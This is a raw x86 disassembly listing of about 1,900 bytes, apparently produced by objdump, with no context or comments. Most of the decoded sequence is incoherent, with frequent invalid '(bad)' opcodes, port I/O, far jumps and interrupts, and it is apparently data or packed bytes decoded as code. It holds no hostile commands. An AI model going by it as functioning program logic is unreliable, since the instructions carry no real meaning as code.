  41acbe:	adc    ebx,DWORD PTR ds:0x4ed1ad8d
  41acc4:	dec    ecx
  41acc5:	adc    BYTE PTR [ecx+0x64],0xba
  41acc9:	inc    edx
  41acca:	shl    edi,cl
  41accc:	std    
  41accd:	ds jo  0x41ac72
  41acd0:	out    dx,al
  41acd1:	ds jns 0x41ad3b
  41acd4:	or     BYTE PTR [edx-0x4a],0xb
  41acd8:	sub    ebx,esi
  41acda:	cwde   
  41acdb:	lods   al,BYTE PTR ds:[esi]
  41acdc:	push   ds
  41acdd:	xchg   ecx,eax
  41acde:	mul    DWORD PTR [edi]
  41ace0:	test   al,0xe5
  41ace2:	push   es
  41ace3:	iret   
  41ace4:	inc    esp
  41ace5:	(bad)  
  41ace6:	aad    0xd7
  41ace8:	mov    edx,0xad56666b
  41aced:	(bad)  
  41acee:	jle    0x41accb
  41acf0:	push   ebp
  41acf1:	mov    bl,0x88
  41acf3:	mov    dl,ah
  41acf5:	fxtract 
  41acf7:	xchg   esp,eax
  41acf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acf9:	lods   eax,DWORD PTR fs:[esi]
  41acfb:	xor    ebx,ebx
  41acfd:	xchg   ebx,eax
  41acfe:	mov    ds:0x89d5f12a,eax
  41ad03:	inc    edx
  41ad04:	out    dx,eax
  41ad05:	pop    edx
  41ad06:	adc    BYTE PTR [ebp+eax*1-0x28],al
  41ad0a:	js     0x41ad69
  41ad0c:	cli    
  41ad0d:	test   al,0xff
  41ad0f:	dec    ebp
  41ad10:	jo     0x41ac9d
  41ad12:	popa   
  41ad13:	push   0x325f3bb5
  41ad18:	stos   BYTE PTR es:[edi],al
  41ad19:	nop
  41ad1a:	lahf   
  41ad1b:	cdq    
  41ad1c:	jno    0x41aceb
  41ad1e:	and    DWORD PTR [edi-0x17],ebp
  41ad21:	in     al,0x78
  41ad23:	mov    ebp,ds
  41ad25:	sub    eax,0x8663a02b
  41ad2a:	call   0x2cf4:0x40f9445e
  41ad31:	sbb    BYTE PTR [edi],dh
  41ad33:	add    eax,0x671d3e1e
  41ad38:	and    ebx,ebx
  41ad3a:	sub    bl,BYTE PTR [edi]
  41ad3c:	and    BYTE PTR [edi-0x14],0x46
  41ad40:	ret    0x9dcb
  41ad43:	pop    edi
  41ad44:	loop   0x41ad56
  41ad46:	js     0x41ad35
  41ad48:	add    eax,0x21bd48c9
  41ad4d:	int    0x6d
  41ad4f:	in     al,dx
  41ad50:	mov    al,ds:0xd08b83bf
  41ad55:	adc    DWORD PTR [esi+0x74801981],esi
  41ad5b:	ss pop esi
  41ad5d:	cmp    bl,BYTE PTR [ebp+0x6a7f0fb9]
  41ad63:	and    BYTE PTR [edi-0x36],dl
  41ad66:	jge    0x41ada4
  41ad68:	(bad)  
  41ad69:	lock outs dx,DWORD PTR ds:[esi]
  41ad6b:	sub    DWORD PTR [ecx-0x69],ecx
  41ad6e:	push   ecx
  41ad6f:	mov    bh,0xf8
  41ad71:	jl     0x41ad58
  41ad73:	int3   
  41ad74:	ror    DWORD PTR [edi+0x2dce8727],1
  41ad7a:	ins    BYTE PTR es:[edi],dx
  41ad7b:	jmp    0x41ad16
  41ad7d:	add    al,0x55
  41ad7f:	stos   DWORD PTR es:[edi],eax
  41ad80:	sbb    dh,dh
  41ad82:	or     DWORD PTR [edi-0x6a],0x77
  41ad86:	arpl   sp,bx
  41ad88:	outs   dx,BYTE PTR ds:[esi]
  41ad89:	mov    ebp,0x6638c848
  41ad8e:	pop    es
  41ad8f:	lahf   
  41ad90:	push   0xffffffaf
  41ad92:	or     eax,0x8c22acfd
  41ad97:	ret    0xcd09
  41ad9a:	mov    ds:0x533d629b,al
  41ad9f:	or     bh,cl
  41ada1:	pop    ebx
  41ada2:	in     al,0xf
  41ada4:	cmp    eax,0x32db740a
  41ada9:	jp     0x41ae1f
  41adab:	out    dx,al
  41adac:	(bad)  
  41adad:	mov    dh,0x51
  41adaf:	jle    0x41ae08
  41adb1:	(bad)
  41adb5:	mov    ecx,0xf902ef3f
  41adba:	ins    BYTE PTR es:[edi],dx
  41adbb:	aas    
  41adbc:	outs   dx,BYTE PTR ds:[esi]
  41adbd:	jge    0x41ae2e
  41adbf:	inc    edi
  41adc0:	(bad)  
  41adc1:	lods   eax,DWORD PTR ds:[esi]
  41adc2:	aas    
  41adc3:	add    ebp,DWORD PTR [ecx]
  41adc5:	add    edx,DWORD PTR [ecx+0x6ef772ab]
  41adcb:	dec    edx
  41adcc:	lds    ebp,FWORD PTR [ebx+0x15]
  41adcf:	push   0xffffff81
  41add1:	mov    ss,WORD PTR [eax-0x20]
  41add4:	int3   
  41add5:	jns    0x41ada7
  41add7:	sub    eax,ecx
  41add9:	dec    esi
  41adda:	retf   0x14de
  41addd:	arpl   si,ax
  41addf:	lds    ebx,FWORD PTR [edx+0x17606d9e]
  41ade5:	add    eax,edi
  41ade7:	stos   BYTE PTR es:[edi],al
  41ade8:	(bad)  
  41ade9:	sbb    dl,BYTE PTR [ebx-0x27]
  41adec:	mov    ds:0x6070b741,al
  41adf1:	stos   DWORD PTR es:[edi],eax
  41adf2:	mov    dl,0xd
  41adf4:	and    al,dh
  41adf6:	adc    DWORD PTR [edx-0x305fe97b],0x5c9fba62
  41ae00:	dec    edx
  41ae01:	adc    bh,cl
  41ae03:	pop    esi
  41ae04:	xor    BYTE PTR [ebx+0x77],ch
  41ae07:	pop    ebp
  41ae08:	and    eax,0x3578a93
  41ae0d:	xlat   BYTE PTR ds:[ebx]
  41ae0e:	sub    DWORD PTR [ebx],esi
  41ae10:	bound  esi,QWORD PTR [edx]
  41ae12:	mov    bl,0x59
  41ae15:	call   0x7a740057
  41ae1a:	ins    BYTE PTR es:[edi],dx
  41ae1b:	mov    gs,WORD PTR [eax]
  41ae1d:	outs   dx,DWORD PTR ds:[esi]
  41ae1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae1f:	shl    DWORD PTR [edx-0x7f70632e],cl
  41ae25:	or     al,0x69
  41ae28:	adc    eax,0xa82077af
  41ae2d:	jno    0x41adba
  41ae2f:	test   al,0x5a
  41ae31:	sahf   
  41ae32:	add    eax,0xfcf0c949
  41ae37:	je     0x41ae75
  41ae39:	sub    ebx,DWORD PTR ds:0x7753601e
  41ae3f:	cmc    
  41ae40:	mov    dh,al
  41ae42:	push   esp
  41ae43:	add    DWORD PTR [ebx+0x77],esi
  41ae46:	scas   eax,DWORD PTR es:[edi]
  41ae47:	pop    ds
  41ae48:	xchg   ecx,eax
  41ae49:	je     0x41ae1e
  41ae4b:	adc    eax,0x4a1eddfc
  41ae50:	repz sbb cl,dl
  41ae53:	push   esi
  41ae54:	pop    ecx
  41ae55:	addr16 dec esi
  41ae57:	or     ebx,DWORD PTR [ecx-0x74]
  41ae5a:	mov    ch,0x3
  41ae5c:	or     al,0x56
  41ae5e:	cwde   
  41ae5f:	xchg   edx,eax
  41ae60:	fimul  DWORD PTR [ebp-0x4eaedfe3]
  41ae66:	mov    edi,0x67cac84a
  41ae6b:	jnp    0x41ae19
  41ae6d:	jp     0x41aed9
  41ae6f:	fucomip st,st(1)
  41ae71:	add    esp,esp
  41ae73:	stos   BYTE PTR es:[edi],al
  41ae74:	in     al,0xe0
  41ae76:	pusha  
  41ae77:	fnstcw WORD PTR [edx-0x57]
  41ae7a:	mov    al,ds:0x1ffab33a
  41ae7f:	das    
  41ae80:	jecxz  0x41aede
  41ae82:	rcl    BYTE PTR [ebx-0x8],0x1e
  41ae86:	pop    esp
  41ae87:	inc    edx
  41ae88:	mov    ah,0xf1
  41ae8a:	add    BYTE PTR [eax],bh
  41ae8c:	repz ror ecx,0xdf
  41ae90:	sti    
  41ae91:	pop    ss
  41ae92:	fistp  WORD PTR [edx-0xc]
  41ae95:	jmp    0x23de:0xb559568e
  41ae9c:	ror    DWORD PTR [edx],cl
  41ae9e:	(bad)  
  41ae9f:	leave  
  41aea0:	pop    ds
  41aea1:	sbb    al,0xc1
  41aea3:	rcl    BYTE PTR [edi+edx*1],cl
  41aea6:	sub    eax,0x67fe283e
  41aeab:	test   ah,al
  41aead:	dec    eax
  41aeae:	lea    edx,[eax]
  41aeb0:	push   ss
  41aeb1:	mov    bh,0x93
  41aeb3:	dec    esi
  41aeb4:	and    eax,0x578cbbd4
  41aeb9:	dec    edx
  41aeba:	ror    DWORD PTR [ebp-0x33dd579a],0x63
  41aec1:	out    0xb6,eax
  41aec3:	push   cx
  41aec5:	jnp    0x41ae76
  41aec7:	jae    0x41aeb2
  41aec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeca:	lods   eax,DWORD PTR ds:[esi]
  41aecb:	add    DWORD PTR [esi+edx*4+0xa],ecx
  41aecf:	adc    eax,0xb0d8bdfd
  41aed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aed5:	arpl   WORD PTR [esi],bx
  41aed7:	sub    al,0xe8
  41aed9:	mov    BYTE PTR ds:0x530631d9,bl
  41aedf:	push   esp
  41aee0:	mov    cl,0x9b
  41aee2:	xchg   ebx,eax
  41aee3:	enter  0x1f34,0xbb
  41aee7:	sub    al,0x34
  41aee9:	outs   dx,BYTE PTR ds:[esi]
  41aeea:	cdq    
  41aeeb:	std    
  41aeec:	ror    eax,1
  41aeee:	leave  
  41aeef:	mov    ds:0x386cc318,eax
  41aef4:	dec    edx
  41aef5:	mov    edi,0xd85014dc
  41aefa:	dec    ebp
  41aefb:	lock sub BYTE PTR [esi],ah
  41aefe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeff:	mov    ?,WORD PTR [eax+0x684d1f5b]
  41af05:	lock adc al,0x62
  41af08:	mov    bl,BYTE PTR [edi+esi*1-0x4a2a0f21]
  41af0f:	mov    WORD PTR [esi-0x452ad7d1],gs
  41af15:	shl    DWORD PTR [eax],cl
  41af17:	sbb    BYTE PTR [ebx],dh
  41af19:	repnz mov bl,0x37
  41af1c:	add    DWORD PTR [ebx-0x34],esi
  41af1f:	jl     0x41af78
  41af21:	call   DWORD PTR [edi-0x25]
  41af24:	and    DWORD PTR [eax-0x2],edi
  41af27:	stos   BYTE PTR es:[edi],al
  41af28:	adc    eax,0x1404f943
  41af2d:	clc    
  41af2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af2f:	(bad)  
  41af30:	adc    eax,0xda525e11
  41af35:	and    DWORD PTR [ebx+edx*4+0x220906f9],0x9dfc546e
  41af40:	jne    0x41af9e
  41af42:	(bad)  
  41af43:	scas   eax,DWORD PTR es:[edi]
  41af44:	in     al,0xc8
  41af46:	add    eax,0x7084b042
  41af4b:	adc    eax,0x74dd2c89
  41af50:	inc    edi
  41af51:	das    
  41af52:	mov    ds:0x867e36f3,eax
  41af57:	imul   BYTE PTR [ebx]
  41af59:	retf   0xf22e
  41af5c:	dec    ebx
  41af5d:	imul   edx,DWORD PTR [edx+0x7025e724],0x61
  41af64:	jle    0x41aef0
  41af66:	add    BYTE PTR [ebx+edx*2],bl
  41af69:	mov    ss,WORD PTR [eax]
  41af6b:	jno    0x41aeef
  41af6d:	call   0x9ef9384c
  41af72:	mov    edi,0xa0c2172c
  41af77:	add    bh,BYTE PTR [ecx-0x68]
  41af7a:	sub    bh,BYTE PTR [ebx+0x19]
  41af7d:	adc    edi,DWORD PTR [esp+ebp*4]
  41af80:	push   esp
  41af81:	arpl   di,sp
  41af83:	push   ebp
  41af84:	pushf  
  41af85:	push   0x7a7cc6f0
  41af8a:	repnz ins DWORD PTR es:[edi],dx
  41af8c:	mov    edi,0x3637d6d2
  41af91:	xchg   ecx,eax
  41af92:	test   DWORD PTR es:[eax-0x6c564dfa],0x36ea49c0
  41af9d:	sbb    eax,0x3b31182
  41afa2:	dec    edx
  41afa3:	out    0xce,eax
  41afa5:	aaa    
  41afa6:	push   es
  41afa7:	mov    edi,0x5c332cb6
  41afac:	cmp    eax,0x7b8bc4fd
  41afb1:	sbb    edx,DWORD PTR [eax]
  41afb3:	lods   eax,DWORD PTR ds:[esi]
  41afb4:	add    ebp,eax
  41afb6:	in     al,0x28
  41afb8:	leave  
  41afb9:	pop    ss
  41afba:	lds    ebx,FWORD PTR [eax-0x50721482]
  41afc0:	pop    ebx
  41afc1:	fcomp  st(1)
  41afc3:	jl     0x41afeb
  41afc5:	retf   0x5f7e
  41afc8:	repnz push eax
  41afca:	mov    eax,0x2021bc9f
  41afcf:	sti    
  41afd0:	frstor [eax-0x36]
  41afd3:	or     ebx,ecx
  41afd5:	adc    DWORD PTR ds:[ebp+0x59],ebx
  41afd9:	in     eax,dx
  41afda:	cli    
  41afdb:	out    0xf3,eax
  41afdd:	mov    ds:0x4ec0112b,eax
  41afe2:	adc    dl,bh
  41afe4:	cmc    
  41afe5:	in     eax,0xbb
  41afe7:	push   0x270cb324
  41afec:	jmp    0x1201:0xce4d0056
  41aff3:	test   eax,0x1ff79b0d
  41aff8:	pop    edx
  41aff9:	xor    eax,0x48a77b77
  41affe:	cld    
  41afff:	clc    
  41b000:	inc    edx
  41b001:	pop    edx
  41b002:	push   0x56e6dd03
  41b007:	fist   WORD PTR [eax-0x5f75d4ae]
  41b00d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b00e:	cmp    al,0x9c
  41b010:	adc    dl,BYTE PTR [ecx+0x45f1cbd7]
  41b016:	int    0xea
  41b018:	jo     0x41b037
  41b01a:	mov    al,ds:0x99b11a4d
  41b01f:	int    0x65
  41b021:	mov    eax,0xf7f7fce4
  41b026:	rol    BYTE PTR [ecx],0x5f
  41b029:	sub    eax,0x99aaebf9
  41b02e:	sbb    DWORD PTR [esi+0x67a9c4ce],0x6a279706
  41b038:	cli    
  41b039:	lea    eax,[ebx+0x31b10f91]
  41b03f:	(bad)  
  41b041:	sub    BYTE PTR [ebp+0x66],ch
  41b044:	sub    ecx,DWORD PTR [esi+0x28]
  41b047:	(bad)  
  41b048:	(bad)  [eax-0x1eab7e0e]
  41b04e:	ins    DWORD PTR es:[edi],dx
  41b04f:	std    
  41b050:	cs stos BYTE PTR es:[edi],al
  41b052:	pop    edi
  41b053:	addr16 or eax,0x17e34b43
  41b059:	into   
  41b05a:	xchg   esi,eax
  41b05b:	leave  
  41b05c:	add    BYTE PTR [edi+0x5baa34bf],0x4a
  41b063:	cmp    al,0xb2
  41b065:	and    BYTE PTR [ebx+0x65],bl
  41b068:	test   ebx,0x57548dba
  41b06e:	and    al,0x1b
  41b070:	cmp    al,0x87
  41b072:	imul   esi,ebp,0xfffffff7
  41b075:	fiadd  WORD PTR [ebx+edx*8]
  41b078:	fbld   TBYTE PTR [ecx+0x3fce4eec]
  41b07e:	sbb    esp,edx
  41b080:	imul   esi,DWORD PTR [edx-0x1d],0xa
  41b084:	add    cl,ch
  41b086:	js     0x41b0b1
  41b088:	cmp    eax,0xadd5b4a7
  41b08d:	push   edi
  41b08e:	push   cs
  41b08f:	pop    ss
  41b090:	cmp    al,0x73
  41b092:	imul   edi,ebx,0x9e6576d5
  41b098:	loopne 0x41b0c6
  41b09a:	cwde   
  41b09b:	fadd   st(0),st
  41b09d:	aam    0xb9
  41b09f:	xchg   DWORD PTR [ebx-0x66],edx
  41b0a2:	add    al,ch
  41b0a4:	sub    BYTE PTR [edi-0x679b8080],dh
  41b0aa:	xor    edx,DWORD PTR [esi-0x18]
  41b0ad:	xor    eax,0x89a33905
  41b0b2:	(bad)  
  41b0b3:	jl     0x41b0e2
  41b0b5:	jge    0x41b089
  41b0b7:	clc    
  41b0b8:	cmp    BYTE PTR [edi+0x12],cl
  41b0bb:	mov    ebx,0x564b9b4e
  41b0c0:	xlat   BYTE PTR ds:[ebx]
  41b0c1:	inc    edi
  41b0c2:	sbb    edx,DWORD PTR [ebx]
  41b0c4:	rcl    BYTE PTR [edx+ecx*1],cl
  41b0c7:	lahf   
  41b0c8:	mov    edi,0x7b45d625
  41b0cd:	inc    ecx
  41b0ce:	addr16 cmp eax,0x8ff15ba2
  41b0d4:	or     eax,0xba94b3fc
  41b0d9:	xlat   BYTE PTR ds:[ebx]
  41b0da:	adc    BYTE PTR [eax+0x9],bl
  41b0dd:	jmp    0x112c:0x968b6cc8
  41b0e4:	loop   0x41b13e
  41b0e6:	add    ah,BYTE PTR [ebx-0x17fb448d]
  41b0ec:	and    BYTE PTR [ebp+0x6b],0xe
  41b0f0:	jnp    0x41b0e8
  41b0f2:	jb     0x41b15c
  41b0f4:	inc    esi
  41b0f5:	inc    ebp
  41b0f6:	stos   DWORD PTR es:[edi],eax
  41b0f7:	pop    ss
  41b0f8:	scas   al,BYTE PTR es:[edi]
  41b0f9:	addr16 jp 0x41b0f3
  41b0fc:	jl     0x41b174
  41b0fe:	adc    cl,al
  41b100:	cwde   
  41b101:	adc    BYTE PTR [ebp+0x3c],ch
  41b104:	sahf   
  41b105:	add    al,0xfd
  41b107:	sbb    al,BYTE PTR [bp+si-0x54]
  41b10b:	inc    ebx
  41b10c:	test   al,0x8b
  41b10e:	pusha  
  41b10f:	pop    edi
  41b110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b111:	cmp    bh,BYTE PTR [esi-0x39fe78bb]
  41b117:	add    dl,BYTE PTR [eax]
  41b119:	pop    esi
  41b11a:	xor    eax,0x7586e1fe
  41b11f:	shl    DWORD PTR [edx],0xe6
  41b122:	stos   BYTE PTR es:[edi],al
  41b123:	test   BYTE PTR [edx-0x62],al
  41b126:	add    ebp,edx
  41b128:	xchg   ebp,eax
  41b129:	xor    BYTE PTR [ecx-0x4b],dl
  41b12c:	inc    ebp
  41b12d:	ds dec edx
  41b12f:	loope  0x41b110
  41b131:	sahf   
  41b132:	fistp  DWORD PTR [ecx-0x67]
  41b135:	xchg   ebp,eax
  41b136:	pusha  
  41b137:	xor    eax,0x42b7b079
  41b13c:	mov    cl,0x9a
  41b13e:	mov    ecx,0xf4e9113d
  41b143:	add    eax,DWORD PTR [ecx+0x78]
  41b146:	jo     0x41b167
  41b148:	sbb    esp,DWORD PTR [ecx+esi*1]
  41b14b:	int3   
  41b14c:	fbld   TBYTE PTR [ebp+0x23760cae]
  41b152:	(bad)
  41b155:	xchg   ecx,eax
  41b156:	xchg   edx,eax
  41b157:	pop    ss
  41b158:	sbb    eax,0x65cc3517
  41b15d:	retf   0x54a
  41b160:	and    al,0x99
  41b162:	es ja  0x41b1d1
  41b165:	sbb    bl,0x0
  41b168:	jmp    0x41b1bf
  41b16a:	out    0xa8,eax
  41b16c:	inc    ecx
  41b16d:	adc    edx,esp
  41b16f:	das    
  41b170:	mov    ds:0xa3c2d022,eax
  41b175:	ins    DWORD PTR es:[edi],dx
  41b176:	int3   
  41b177:	push   edi
  41b178:	adc    bl,ch
  41b17a:	inc    eax
  41b17b:	loope  0x41b18e
  41b17d:	fdivr  QWORD PTR [ebx]
  41b17f:	sub    BYTE PTR [ebx+0x1d],0xb2
  41b183:	fmul   DWORD PTR [ebx]
  41b185:	add    eax,0xd12b51f3
  41b18a:	(bad)  
  41b18b:	retf   
  41b18c:	add    eax,0x7ab388ba
  41b191:	clc    
  41b192:	push   esp
  41b193:	xchg   edi,eax
  41b194:	pop    ss
  41b195:	fst    DWORD PTR [ebp-0x5b]
  41b198:	mov    bl,0x30
  41b19a:	in     eax,0x39
  41b19c:	adc    al,BYTE PTR [edi+0x6a6bfdec]
  41b1a2:	jg     0x41b200
  41b1a4:	into   
  41b1a5:	add    ebp,esp
  41b1a7:	push   eax
  41b1a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1a9:	and    al,0x2c
  41b1ab:	mov    edx,0x58f87fca
  41b1b0:	ds add al,bh
  41b1b3:	gs and bl,bh
  41b1b6:	aad    0x38
  41b1b8:	jns    0x41b21f
  41b1ba:	push   edi
  41b1bb:	int    0xb8
  41b1bd:	xlat   BYTE PTR ds:[ebx]
  41b1be:	cmc    
  41b1bf:	fucomp st(1)
  41b1c1:	ins    BYTE PTR es:[edi],dx
  41b1c2:	push   edx
  41b1c3:	xor    eax,edx
  41b1c5:	dec    ebp
  41b1c6:	sbb    ebx,DWORD PTR [esi-0x5f782af2]
  41b1cc:	in     al,0x4e
  41b1ce:	shr    DWORD PTR [ebp+0x42],1
  41b1d1:	sub    bh,dh
  41b1d3:	push   eax
  41b1d4:	pusha  
  41b1d5:	mov    ecx,0xd4ad776e
  41b1da:	xor    ax,0x2510
  41b1de:	mov    ds:0xb16f98af,al
  41b1e3:	pop    ss
  41b1e4:	xchg   esp,eax
  41b1e5:	cli    
  41b1e6:	xor    DWORD PTR [eax],ebx
  41b1e8:	jmp    0x15ec:0xc6ff94f7
  41b1ef:	leave  
  41b1f0:	or     ebp,DWORD PTR [eax-0x38]
  41b1f3:	mov    al,ds:0x1de03c79
  41b1f8:	iret   
  41b1f9:	jbe    0x41b1b2
  41b1fb:	ja     0x41b257
  41b1fd:	jmp    0x41b183
  41b1ff:	dec    edx
  41b200:	out    0x18,al
  41b202:	cli    
  41b203:	aaa    
  41b204:	mov    eax,esi
  41b206:	loopne 0x41b1ad
  41b208:	nop
  41b209:	xor    ebp,ecx
  41b20b:	sbb    edx,ebx
  41b20d:	imul   ebx,esp,0xe3de9249
  41b213:	jne    0x41b27c
  41b215:	xor    DWORD PTR [eax],esp
  41b217:	mov    eax,0xd3fdf299
  41b21c:	(bad)  
  41b21d:	xor    al,0x8e
  41b21f:	inc    edi
  41b220:	sub    eax,edi
  41b222:	ins    BYTE PTR es:[edi],dx
  41b223:	imul   esp,DWORD PTR [eax],0x1b
  41b226:	add    DWORD PTR ds:0xc7cb70a,0x312e1344
  41b230:	inc    esp
  41b231:	push   edi
  41b232:	mov    BYTE PTR [eax],0xfe
  41b235:	inc    edx
  41b236:	in     eax,0x4c
  41b238:	jo     0x41b23e
  41b23a:	iret   
  41b23b:	fwait
  41b23c:	jnp    0x41b1e1
  41b23e:	or     DWORD PTR [esi],eax
  41b240:	stos   BYTE PTR es:[edi],al
  41b241:	push   0xf8a3a14f
  41b246:	mov    esi,0xe1bf8929
  41b24b:	rcl    ah,cl
  41b24d:	and    al,dh
  41b24f:	in     al,dx
  41b250:	bound  ebp,QWORD PTR [ecx-0x45364a62]
  41b256:	(bad)  
  41b257:	sar    edi,cl
  41b259:	mov    ah,0x57
  41b25b:	or     esp,DWORD PTR [ebp-0x46b5ed67]
  41b261:	int3   
  41b262:	imul   edi,ebp,0x56
  41b265:	sbb    eax,edx
  41b267:	jo     0x41b246
  41b269:	and    ax,0xb251
  41b26d:	lds    edx,FWORD PTR [ebx-0x5955161a]
  41b273:	xchg   esp,eax
  41b274:	sbb    eax,0xed2399f
  41b279:	cmc    
  41b27a:	loopne 0x41b241
  41b27c:	jnp    0x41b2b6
  41b27e:	sbb    eax,0xe2e36236
  41b283:	test   al,0xb4
  41b285:	mov    ebx,0x6cd0fa61
  41b28a:	gs mov ecx,0x4508a5cd
  41b290:	pop    edx
  41b291:	adc    al,0x61
  41b293:	icebp  
  41b294:	push   ecx
  41b295:	popf   
  41b296:	and    eax,ecx
  41b298:	imul   eax,DWORD PTR [ecx+0xb],0x27
  41b29c:	jae    0x41b221
  41b29e:	mov    ecx,0x39e43784
  41b2a3:	dec    edi
  41b2a4:	into   
  41b2a5:	push   ebp
  41b2a6:	test   ebx,ecx
  41b2a8:	jnp    0x41b325
  41b2aa:	jo     0x41b270
  41b2ac:	dec    eax
  41b2ad:	mov    ch,0x7
  41b2af:	add    esi,DWORD PTR [edx+edx*1]
  41b2b2:	repnz and BYTE PTR [ebx],al
  41b2b5:	jmp    0x772f:0x9487d653
  41b2bc:	inc    ebx
  41b2bd:	(bad)  
  41b2be:	fsub   QWORD PTR [bp+0x74e5]
  41b2c3:	push   ebx
  41b2c4:	cmp    al,0xfc
  41b2c6:	dec    ebp
  41b2c7:	dec    ebp
  41b2c8:	sar    BYTE PTR [ebx],0x3c
  41b2cb:	mov    bl,0xf6
  41b2cd:	mov    edx,0xecc7af85
  41b2d2:	sub    DWORD PTR [ebx+eiz*1],esp
  41b2d5:	pop    ds
  41b2d6:	out    0x98,al
  41b2d8:	icebp  
  41b2d9:	addr16 mov eax,0x50864d59
  41b2df:	(bad)  
  41b2e1:	popf   
  41b2e2:	pop    eax
  41b2e3:	imul   edx,DWORD PTR [edi+ecx*1+0x5f],0x56
  41b2e8:	pop    DWORD PTR [eax-0x3e]
  41b2eb:	xor    ecx,DWORD PTR [edi+0x25]
  41b2ee:	jg     0x41b36e
  41b2f0:	or     DWORD PTR [ebx],0x70
  41b2f3:	jno    0x41b2d8
  41b2f5:	cdq    
  41b2f6:	mov    ds:0xe7f5ba67,al
  41b2fb:	out    dx,al
  41b2fc:	(bad)  
  41b2fe:	iret   
  41b2ff:	pop    edx
  41b300:	dec    eax
  41b301:	or     bh,BYTE PTR [esi]
  41b303:	xchg   ebx,eax
  41b304:	in     al,dx
  41b305:	pop    ds
  41b306:	xchg   ebx,eax
  41b307:	lock (bad) 
  41b309:	push   ebp
  41b30a:	mov    ah,0x9f
  41b30c:	sbb    al,0x33
  41b30e:	mov    edi,DWORD PTR [ebx+0x34]
  41b311:	add    ecx,eax
  41b313:	(bad)  
  41b314:	into   
  41b315:	into   
  41b316:	sub    bl,BYTE PTR [ebx]
  41b318:	lock popf 
  41b31a:	es add al,0xee
  41b31d:	out    0x25,al
  41b31f:	scas   al,BYTE PTR es:[edi]
  41b320:	mov    dl,0xba
  41b322:	cli    
  41b323:	addr16 dec esi
  41b325:	fisub  WORD PTR [eax+0x4b8e35e2]
  41b32b:	(bad)  
  41b32c:	add    al,BYTE PTR [eax-0x3e]
  41b32f:	stos   BYTE PTR es:[edi],al
  41b330:	or     edi,ecx
  41b332:	arpl   WORD PTR [ebx-0x2d],dx
  41b335:	mov    WORD PTR [eax+0x687a679e],es
  41b33b:	loopne 0x41b339
  41b33d:	sub    DWORD PTR [eax],ecx
  41b33f:	mov    dl,0x79
  41b341:	or     DWORD PTR [ecx+ebp*4],esi
  41b344:	add    cl,BYTE PTR [ebp+0x65]
  41b347:	sahf   
  41b348:	adc    DWORD PTR [edx],edx
  41b34a:	outs   dx,DWORD PTR ds:[esi]
  41b34b:	mov    bl,0x8b
  41b34d:	in     al,0xfb
  41b34f:	pop    edx
  41b350:	pop    esi
  41b351:	mov    es,WORD PTR [ecx+0x3401e539]
  41b357:	or     ah,BYTE PTR [ebx+0x50]
  41b35a:	pop    DWORD PTR [esi]
  41b35c:	push   eax
  41b35d:	gs inc ebx
  41b35f:	jne    0x41b3b3
  41b361:	xchg   dl,ch
  41b363:	int3   
  41b364:	in     eax,dx
  41b365:	or     esp,esi
  41b367:	arpl   WORD PTR [eax-0x38],si
  41b36a:	mov    esi,0x1d4d944d
  41b36f:	adc    edx,DWORD PTR [eax]
  41b371:	jmp    0x496c:0x802011ea
  41b378:	or     al,0xc
  41b37a:	fstp   QWORD PTR [ecx]
  41b37c:	xchg   esi,eax
  41b37d:	or     dl,BYTE PTR [ebx+edi*1]
  41b380:	and    al,0x28
  41b382:	or     bl,BYTE PTR ds:0x16535c96
  41b388:	mov    cl,0x0
  41b38a:	paddusw mm7,mm1
  41b38d:	pop    esi
  41b38e:	sbb    al,0x23
  41b390:	ins    BYTE PTR es:[edi],dx
  41b391:	ret    0x7dd
  41b394:	mov    esi,esi
  41b396:	sbb    BYTE PTR [eax+0x400affa9],al
  41b39c:	popf   
  41b39d:	inc    ebx
  41b39e:	lods   eax,DWORD PTR ds:[esi]
  41b39f:	mov    ebp,0xa140666f
  41b3a4:	cwde   
  41b3a5:	mov    edi,0x4aaa7850
  41b3aa:	dec    esi
  41b3ab:	out    dx,al
  41b3ac:	test   DWORD PTR [edi-0x46],eax
  41b3af:	icebp  
  41b3b0:	jmp    0x132c:0xa0b70d11
  41b3b7:	retf   
  41b3b8:	xor    dl,bh
  41b3ba:	(bad)  
  41b3bb:	cld    
  41b3bc:	add    dh,BYTE PTR [eax-0x5f]
  41b3bf:	dec    edx
  41b3c0:	fs icebp 
  41b3c2:	jle    0x41b401
  41b3c4:	in     al,0x8c
  41b3c6:	mov    ebp,0x38c10a69
  41b3cb:	adc    esp,DWORD PTR ds:0xddb36e6e
  41b3d1:	inc    ebx
  41b3d2:	aas    
  41b3d3:	daa    
  41b3d4:	repnz (bad) 
  41b3d6:	ss (bad) ds:[esi]
  41b3da:	cmp    al,0x3d
  41b3dc:	sar    BYTE PTR [ebp-0x7eb1880e],cl
  41b3e2:	iret   
  41b3e3:	cmc    
  41b3e4:	mov    ecx,0x77b48034
  41b3e9:	aaa    
  41b3ea:	mov    esp,0x26f5ac2f
  41b3ef:	retf   0x9509
  41b3f2:	cmp    ah,BYTE PTR [ebx]
  41b3f4:	sub    DWORD PTR es:[edi],edx
  41b3f7:	imul   ebp,DWORD PTR [ecx-0x25],0xfffffffd
  41b3fb:	sub    DWORD PTR [esi],esi
  41b3fd:	or     ebp,DWORD PTR [edx-0x20]
  41b400:	add    BYTE PTR [edx-0x49306191],dl
  41b406:	jmp    0x3a4fc30b
  41b40b:	xchg   esp,eax
  41b40c:	(bad)  
  41b40d:	dec    DWORD PTR [esi]
  41b40f:	jns    0x41b40a
  41b411:	int3   
  41b412:	scas   al,BYTE PTR es:[edi]
  41b413:	fwait
  41b414:	addr16 inc edi
  41b416:	and    eax,0xf3a11c5c
  41b41b:	dec    esi
  41b41c:	fwait
  41b41d:	jg     0x41b408
  41b41f:	inc    esi
  41b420:	xchg   esi,eax
  41b421:	aad    0x66
  41b423:	mov    WORD PTR [ecx+ecx*1+0x3809a3af],cs
  41b42a:	xchg   edx,eax
  41b42b:	mov    cl,0xf0
  41b42d:	test   ch,ch
  41b42f:	inc    edx
  41b430:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
